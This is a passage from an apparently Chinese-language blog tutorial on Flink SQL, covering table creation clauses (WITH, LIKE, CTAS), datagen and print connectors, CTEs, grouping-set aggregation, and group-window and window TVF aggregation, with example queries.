<span class="string">'csv'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>一般 with 中的配置项由 Flink SQL 的 Connector（链接外部存储的连接器） 来定义，每种 Connector 提供的with 配置项都是不同的。</p><ul><li><strong>LIKE</strong></li></ul><p>用于基于现有表的定义创建表。此外，用户可以扩展原始表或排除表的某些部分。可以使用该子句重用(可能还会覆盖)某些连接器属性，或者向外部定义的表添加水印。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders (</span><br><span class="line">    <span class="string">`user`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line">    product <span class="keyword">STRING</span>,</span><br><span class="line">    order_time <span class="built_in">TIMESTAMP</span>(<span class="number">3</span>)</span><br><span class="line">) <span class="keyword">WITH</span> ( </span><br><span class="line">    <span class="string">'connector'</span> = <span class="string">'kafka'</span>,</span><br><span class="line">    <span class="string">'scan.startup.mode'</span> = <span class="string">'earliest-offset'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders_with_watermark (</span><br><span class="line">    <span class="comment">-- Add watermark definition</span></span><br><span class="line">    WATERMARK <span class="keyword">FOR</span> order_time <span class="keyword">AS</span> order_time - <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span> </span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">    <span class="comment">-- Overwrite the startup-mode</span></span><br><span class="line">    <span class="string">'scan.startup.mode'</span> = <span class="string">'latest-offset'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">LIKE</span> Orders;</span><br></pre></td></tr></table></figure><ul><li><strong>AS select_statement（CTAS）</strong></li></ul><p>在一个create-table-as-select (CTAS)语句中，还可以通过查询的结果创建和填充表。CTAS是使用单个命令创建数据并向表中插入数据的最简单、最快速的方法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> my_ctas_table</span><br><span class="line"><span class="keyword">WITH</span> (</span><br><span class="line">    <span class="string">'connector'</span> = <span class="string">'kafka'</span>,</span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">FROM</span> source_table <span class="keyword">WHERE</span> <span class="keyword">mod</span>(<span class="keyword">id</span>, <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line"><span class="comment"># 注意:CTAS有以下限制:</span></span><br><span class="line"><span class="comment"># 暂不支持创建临时表。</span></span><br><span class="line"><span class="comment"># 目前还不支持指定显式列。</span></span><br><span class="line"><span class="comment"># 还不支持指定显式水印。</span></span><br><span class="line"><span class="comment"># 目前还不支持创建分区表。</span></span><br><span class="line"><span class="comment"># 目前还不支持指定主键约束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 举例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span>, </span><br><span class="line">    ts <span class="built_in">BIGINT</span>, </span><br><span class="line">    vc <span class="built_in">INT</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'print'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test1 (</span><br><span class="line">    <span class="string">`value`</span> <span class="keyword">STRING</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">LIKE</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><p><strong>常用操作</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看表</span></span><br><span class="line"><span class="comment"># 查看所有表</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span> [ ( <span class="keyword">FROM</span> | <span class="keyword">IN</span> ) [catalog_name.]database_name ] [ [<span class="keyword">NOT</span>] <span class="keyword">LIKE</span> &lt;sql_like_pattern&gt; ]</span><br><span class="line"><span class="comment"># 如果没有指定数据库，则从当前数据库返回表。</span></span><br><span class="line"><span class="comment"># LIKE子句中sql pattern的语法与MySQL方言的语法相同:</span></span><br><span class="line"><span class="comment"># %匹配任意数量的字符，甚至零字符，\%匹配一个'%'字符。</span></span><br><span class="line"><span class="comment"># _只匹配一个字符，\_只匹配一个'_'字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看表信息</span></span><br><span class="line">&#123; <span class="keyword">DESCRIBE</span> | <span class="keyword">DESC</span> &#125; [catalog_name.][db_name.]table_name</span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改表</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> [catalog_name.][db_name.]table_name <span class="keyword">RENAME</span> <span class="keyword">TO</span> new_table_name</span><br><span class="line"></span><br><span class="line"><span class="comment">## 删除表</span></span><br><span class="line"><span class="keyword">DROP</span> [<span class="keyword">TEMPORARY</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [catalog_name.][db_name.]table_name</span><br></pre></td></tr></table></figure><h2 id="5、查询">5、查询</h2><h3 id="5-1-DataGen-Print">5.1 DataGen &amp; Print</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">source</span> ( </span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span>, </span><br><span class="line">    ts <span class="built_in">BIGINT</span>, </span><br><span class="line">    vc <span class="built_in">INT</span></span><br><span class="line">) <span class="keyword">WITH</span> ( </span><br><span class="line">    <span class="string">'connector'</span> = <span class="string">'datagen'</span>, </span><br><span class="line">    <span class="string">'rows-per-second'</span>=<span class="string">'1'</span>, </span><br><span class="line">    <span class="string">'fields.id.kind'</span>=<span class="string">'random'</span>, </span><br><span class="line">    <span class="string">'fields.id.min'</span>=<span class="string">'1'</span>, </span><br><span class="line">    <span class="string">'fields.id.max'</span>=<span class="string">'10'</span>, </span><br><span class="line">    <span class="string">'fields.ts.kind'</span>=<span class="string">'sequence'</span>, </span><br><span class="line">    <span class="string">'fields.ts.start'</span>=<span class="string">'1'</span>, </span><br><span class="line">    <span class="string">'fields.ts.end'</span>=<span class="string">'1000000'</span>, </span><br><span class="line">    <span class="string">'fields.vc.kind'</span>=<span class="string">'random'</span>, </span><br><span class="line">    <span class="string">'fields.vc.min'</span>=<span class="string">'1'</span>, </span><br><span class="line">    <span class="string">'fields.vc.max'</span>=<span class="string">'100'</span></span><br><span class="line">);</span><br><span class="line"><span class="comment"># 这样创建的 "source" 表将包含三列数据：id（随机整数在1和10之间）、</span></span><br><span class="line"><span class="comment"># ts（从1递增到1000000的递增序列）和vc（随机整数在1和100之间）。</span></span><br><span class="line"><span class="comment"># 每秒钟会生成一行这样的模拟测试数据。您可以使用这个表作为 Flink 程序的输入源，对数据进行处理和分析。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sink (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span>, </span><br><span class="line">    ts <span class="built_in">BIGINT</span>, </span><br><span class="line">    vc <span class="built_in">INT</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'print'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询源表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">source</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入sink表并查询，这个需要去flink UI界面查看输出</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sink <span class="keyword">select</span>  * <span class="keyword">from</span> <span class="keyword">source</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sink;</span><br></pre></td></tr></table></figure><h3 id="5-2-With子句">5.2 With子句</h3><p>WITH提供了一种编写辅助语句的方法，以便在较大的查询中使用。这些语句通常被称为公共表表达式(Common Table Expression, CTE)，可以认为它们定义了仅为一个查询而存在的临时视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> &lt;with_item_definition&gt; [ , ... ]</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> ...;</span><br><span class="line">&lt;with_item_defintion&gt;:</span><br><span class="line">    with_item_name (column_name[, ...n]) AS ( &lt;select_query&gt; )</span><br><span class="line"></span><br><span class="line"><span class="comment">## 举例</span></span><br><span class="line"><span class="keyword">WITH</span> source_with_total <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">id</span>, vc+<span class="number">10</span> <span class="keyword">AS</span> total</span><br><span class="line">    <span class="keyword">FROM</span> <span class="keyword">source</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">SUM</span>(total)</span><br><span class="line"><span class="keyword">FROM</span> source_with_total</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span>;</span><br></pre></td></tr></table></figure><h3 id="5-3-SELECT-WHERE-子句">5.3 SELECT &amp; WHERE 子句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> select_list <span class="keyword">FROM</span> table_expression [ <span class="keyword">WHERE</span> boolean_expression ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 举例</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">source</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, vc + <span class="number">10</span> <span class="keyword">FROM</span> <span class="keyword">source</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 自定义 Source 的数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, price <span class="keyword">FROM</span> (<span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">2.0</span>), (<span class="number">2</span>, <span class="number">3.1</span>)) <span class="keyword">AS</span> t (<span class="keyword">id</span>, price);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> vc + <span class="number">10</span> <span class="keyword">FROM</span> <span class="keyword">source</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt;<span class="number">10</span>;</span><br></pre></td></tr></table></figure><h3 id="5-4-分组聚合">5.4 分组聚合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## group聚合案例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> source1 (</span><br><span class="line">dim <span class="keyword">STRING</span>,</span><br><span class="line">user_id <span class="built_in">BIGINT</span>,</span><br><span class="line">price <span class="built_in">BIGINT</span>,</span><br><span class="line">row_time <span class="keyword">AS</span> <span class="keyword">cast</span>(<span class="keyword">CURRENT_TIMESTAMP</span> <span class="keyword">as</span> <span class="built_in">timestamp</span>(<span class="number">3</span>)),</span><br><span class="line">WATERMARK <span class="keyword">FOR</span> row_time <span class="keyword">AS</span> row_time - <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'datagen'</span>,</span><br><span class="line"><span class="string">'rows-per-second'</span> = <span class="string">'10'</span>,</span><br><span class="line"><span class="string">'fields.dim.length'</span> = <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'fields.user_id.min'</span> = <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'fields.user_id.max'</span> = <span class="string">'100000'</span>,</span><br><span class="line"><span class="string">'fields.price.min'</span> = <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'fields.price.max'</span> = <span class="string">'100000'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sink1 (</span><br><span class="line">dim <span class="keyword">STRING</span>,</span><br><span class="line">pv <span class="built_in">BIGINT</span>,</span><br><span class="line">sum_price <span class="built_in">BIGINT</span>,</span><br><span class="line">max_price <span class="built_in">BIGINT</span>,</span><br><span class="line">min_price <span class="built_in">BIGINT</span>,</span><br><span class="line">uv <span class="built_in">BIGINT</span>,</span><br><span class="line">window_start <span class="built_in">bigint</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'print'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sink1</span><br><span class="line"><span class="keyword">select</span> dim,</span><br><span class="line"><span class="keyword">count</span>(*) <span class="keyword">as</span> pv,</span><br><span class="line"><span class="keyword">sum</span>(price) <span class="keyword">as</span> sum_price,</span><br><span class="line"><span class="keyword">max</span>(price) <span class="keyword">as</span> max_price,</span><br><span class="line"><span class="keyword">min</span>(price) <span class="keyword">as</span> min_price,</span><br><span class="line"><span class="comment">-- 计算 uv 数</span></span><br><span class="line"><span class="keyword">count</span>(<span class="keyword">distinct</span> user_id) <span class="keyword">as</span> uv,</span><br><span class="line"><span class="keyword">cast</span>((<span class="keyword">UNIX_TIMESTAMP</span>(<span class="keyword">CAST</span>(row_time <span class="keyword">AS</span> <span class="keyword">STRING</span>))) / <span class="number">60</span> <span class="keyword">as</span> <span class="built_in">bigint</span>) <span class="keyword">as</span> window_start</span><br><span class="line"><span class="keyword">from</span> source1</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">dim,</span><br><span class="line"><span class="comment">-- UNIX_TIMESTAMP得到秒的时间戳，将秒级别时间戳 / 60 转化为 1min， </span></span><br><span class="line"><span class="keyword">cast</span>((<span class="keyword">UNIX_TIMESTAMP</span>(<span class="keyword">CAST</span>(row_time <span class="keyword">AS</span> <span class="keyword">STRING</span>))) / <span class="number">60</span> <span class="keyword">as</span> <span class="built_in">bigint</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 多维分析</span></span><br><span class="line"><span class="comment"># Group 聚合也支持 Grouping sets 、Rollup 、Cube，如下案例是Grouping sets</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  supplier_id</span><br><span class="line">, rating</span><br><span class="line">, product_id</span><br><span class="line">, <span class="keyword">COUNT</span>(*)</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">'supplier1'</span>, <span class="string">'product1'</span>, <span class="number">4</span>),</span><br><span class="line">  (<span class="string">'supplier1'</span>, <span class="string">'product2'</span>, <span class="number">3</span>),</span><br><span class="line">  (<span class="string">'supplier2'</span>, <span class="string">'product3'</span>, <span class="number">3</span>),</span><br><span class="line">  (<span class="string">'supplier2'</span>, <span class="string">'product4'</span>, <span class="number">4</span>)</span><br><span class="line">)</span><br><span class="line"><span class="comment">-- 供应商id、产品id、评级</span></span><br><span class="line"><span class="keyword">AS</span> Products(supplier_id, product_id, rating)  </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">GROUPING</span> <span class="keyword">SETS</span>(</span><br><span class="line">  (supplier_id, product_id, rating),</span><br><span class="line">  (supplier_id, product_id),</span><br><span class="line">  (supplier_id, rating),</span><br><span class="line">  (supplier_id),</span><br><span class="line">  (product_id, rating),</span><br><span class="line">  (product_id),</span><br><span class="line">  (rating),</span><br><span class="line">  ()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="5-5-分组窗口聚合">5.5 分组窗口聚合</h3><p>从1.13版本开始，分组窗口聚合已经标记为过时，鼓励使用更强大、更有效的窗口TVF聚合，在这里简单做个介绍。直接把窗口自身作为分组key放在GROUP BY之后的，所以也叫“分组窗口聚合”。SQL查询的分组窗口是通过 GROUP BY 子句定义的。类似于使用常规 GROUP BY 语句的查询，窗口分组语句的 GROUP BY 子句中带有一个窗口函数为每个分组计算出一个结果。<strong>SQL中只支持基于时间的窗口</strong>，不支持基于元素个数的窗口</p><table><thead><tr><th>分组窗口函数</th><th>描述</th></tr></thead><tbody><tr><td>TUMBLE(time_attr, interval)</td><td>定义一个滚动窗口。滚动窗口把行分配到有固定持续时间（ interval ）的不重叠的连续窗口。比如，5 分钟的滚动窗口以 5 分钟为间隔对行进行分组。滚动窗口可以定义在事件时间（批处理、流处理）或处理时间（流处理）上。</td></tr><tr><td>HOP(time_attr, interval, interval)</td><td>定义一个跳跃的时间窗口（在 Table API 中称为滑动窗口）。滑动窗口有一个固定的持续时间（ 第二个 interval 参数 ）以及一个滑动的间隔（第一个 interval 参数 ）。若滑动间隔小于窗口的持续时间，滑动窗口则会出现重叠；因此，行将会被分配到多个窗口中。比如，一个大小为 15 分组的滑动窗口，其滑动间隔为 5 分钟，将会把每一行数据分配到 3 个 15 分钟的窗口中。滑动窗口可以定义在事件时间（批处理、流处理）或处理时间（流处理）上。</td></tr><tr><td>SESSION(time_attr, interval)</td><td>定义一个会话时间窗口。会话时间窗口没有一个固定的持续时间，但是它们的边界会根据 interval 所定义的不活跃时间所确定；即一个会话时间窗口在定义的间隔时间内没有时间出现，该窗口会被关闭。例如时间窗口的间隔时间是 30 分钟，当其不活跃的时间达到30分钟后，若观测到新的记录，则会启动一个新的会话时间窗口（否则该行数据会被添加到当前的窗口），且若在 30 分钟内没有观测到新纪录，这个窗口将会被关闭。会话时间窗口可以使用事件时间（批处理、流处理）或处理时间（流处理）。</td></tr></tbody></table><p><img src="http://qnypic.shawncoding.top/blog/202404161647744.png" alt></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据准备</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> ws (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">INT</span>,</span><br><span class="line">  vc <span class="built_in">INT</span>,</span><br><span class="line">  pt <span class="keyword">AS</span> PROCTIME(), <span class="comment">--处理时间</span></span><br><span class="line">  et <span class="keyword">AS</span> <span class="keyword">cast</span>(<span class="keyword">CURRENT_TIMESTAMP</span> <span class="keyword">as</span> <span class="built_in">timestamp</span>(<span class="number">3</span>)), <span class="comment">--事件时间</span></span><br><span class="line">  WATERMARK <span class="keyword">FOR</span> et <span class="keyword">AS</span> et - <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>   <span class="comment">--watermark</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'datagen'</span>,</span><br><span class="line">  <span class="string">'rows-per-second'</span> = <span class="string">'10'</span>,</span><br><span class="line">  <span class="string">'fields.id.min'</span> = <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'fields.id.max'</span> = <span class="string">'3'</span>,</span><br><span class="line">  <span class="string">'fields.vc.min'</span> = <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'fields.vc.max'</span> = <span class="string">'100'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 滚动窗口示例（时间属性字段，窗口长度）</span></span><br><span class="line"><span class="keyword">select</span>  </span><br><span class="line"><span class="keyword">id</span>,</span><br><span class="line">TUMBLE_START(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)  wstart,</span><br><span class="line">TUMBLE_END(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)  wend,</span><br><span class="line"><span class="keyword">sum</span>(vc) sumVc</span><br><span class="line"><span class="keyword">from</span> ws</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span>, TUMBLE(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 滑动窗口（时间属性字段，滑动步长，窗口长度）</span></span><br><span class="line"><span class="keyword">select</span>  </span><br><span class="line"><span class="keyword">id</span>,</span><br><span class="line">HOP_START(et, <span class="built_in">INTERVAL</span> <span class="string">'3'</span> <span class="keyword">SECOND</span>,<span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)   wstart,</span><br><span class="line">HOP_END(et, <span class="built_in">INTERVAL</span> <span class="string">'3'</span> <span class="keyword">SECOND</span>,<span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)  wend,</span><br><span class="line">   <span class="keyword">sum</span>(vc) sumVc</span><br><span class="line"><span class="keyword">from</span> ws</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span>, HOP(et, <span class="built_in">INTERVAL</span> <span class="string">'3'</span> <span class="keyword">SECOND</span>,<span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会话窗口（时间属性字段，会话间隔）</span></span><br><span class="line"><span class="keyword">select</span>  </span><br><span class="line"><span class="keyword">id</span>,</span><br><span class="line">SESSION_START(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)  wstart,</span><br><span class="line">SESSION_END(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>)  wend,</span><br><span class="line"><span class="keyword">sum</span>(vc) sumVc</span><br><span class="line"><span class="keyword">from</span> ws</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span>, <span class="keyword">SESSION</span>(et, <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span>);</span><br></pre></td></tr></table></figure><h3 id="5-6-窗口表值函数（TVF）聚合">5.6 窗口表值函数（TVF）聚合</h3><p>对比GroupWindow，TVF窗口更有效和强大。包括：</p><ul><li>提供更多的性能优化手段</li><li>支持GroupingSets语法</li><li>可以在window聚合中使用TopN</li><li>提供累积窗口</li></ul><p>对于窗口表值函数，窗口本身返回的是就是一个表，所以窗口会出现在FROM后面，GROUP BY后面的则是窗口新增的字段window_start和window_end</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">FROM TABLE(</span><br><span class="line">窗口类型(TABLE 表名, DESCRIPTOR(时间字段),INTERVAL时间…)</span><br><span class="line">)</span><br><span class="line">GROUP BY [window_start,][window_end,] <span class="comment">--可选</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 滚动窗口</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">window_start, </span><br><span class="line">window_end, </span><br><span class="line"><span class="keyword">id</span> , <span class="keyword">SUM</span>(vc) </span><br><span class="line">sumVC</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">TABLE</span>(</span><br><span class="line">  TUMBLE(<span class="keyword">TABLE</span> ws, <span class="keyword">DESCRIPTOR</span>(et), <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECONDS</span>))</span><br><span class="line"><span 